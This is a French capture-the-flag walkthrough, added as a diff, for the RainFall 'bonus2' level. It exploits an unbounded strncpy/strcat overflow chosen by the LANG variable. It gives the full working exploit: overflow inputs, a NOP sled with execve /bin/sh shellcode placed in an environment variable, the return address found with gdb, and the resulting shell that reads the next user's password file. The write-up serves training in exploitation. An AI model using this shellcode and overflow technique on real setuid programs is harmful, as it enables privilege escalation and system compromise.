@@ -1,0 +1,45 @@
+Nous avons ici un programme qui recoit deux arguments et pratique des manipulations sur ceux-ci ainsi que sur des variables de verifications.
+Premierement, nous avons des strncpy, mais ceux-ci ne respecte pas la taille de destination sur le troisieme parametre size. Il peut donc y avoir logiquement des problemes de memoire dans ce programme. Nous allons verifier cela. A savoir qu'il faut comparer la variable d'environnement LANG afin d'entrer dans des condition qui nous permette d'avancer dans notre exploit:
+
+bonus2@RainFall:~$ export LANG=fi
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print("a" * 114)') $(python -c 'print("b" * 18 + "cccc")')
+Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbcccc
+Segmentation fault (core dumped)
+
+bonus2@RainFall:~$ dmesg
+	...
+[ 5538.659402] bonus2[4810]: segfault at 63636363 ip 63636363 sp bffff5c0 error 14
+
+Essayons simplement un bufferoverflow ici.
+
+bonus2@RainFall:~$ export SHELLCODE=$(python -c 'print("\x90" * 200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
+
+(gdb) x/32x *environ
+0xbffff7e1:	0x4c454853	0x444f434c	0x90903d45	0x90909090
+0xbffff7f1:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff801:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff811:	0x90909090	0x90909090	0x90909090	0x90909090
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print("a" * 114)') $(python -c 'print("b" * 18 + "\x41\xf8\xff\xbf")')
+Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbA���
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+
+
+bonus2@RainFall:~$ export LANG=nl
+
+bonus2@RainFall:~$ ltrace ./bonus2 a b
+__libc_start_main(0x8048529, 3, 0xbffff6a4, 0x8048640, 0x80486b0 <unfinished ...>
+strncpy(0xbffff5a0, "a", 40)                          = 0xbffff5a0
+strncpy(0xbffff5c8, "b", 32)                          = 0xbffff5c8
+getenv("LANG")                                        = "nl"
+memcmp(0xbffffef4, 0x804873d, 2, 0xb7fff918, 0)       = 1
+memcmp(0xbffffef4, 0x8048740, 2, 0xb7fff918, 0)       = 0
+strcat("Goedemiddag! ", "a")                          = "Goedemiddag! a"
+puts("Goedemiddag! a"Goedemiddag! a
+)                                = 15
++++ exited (status 15) +++
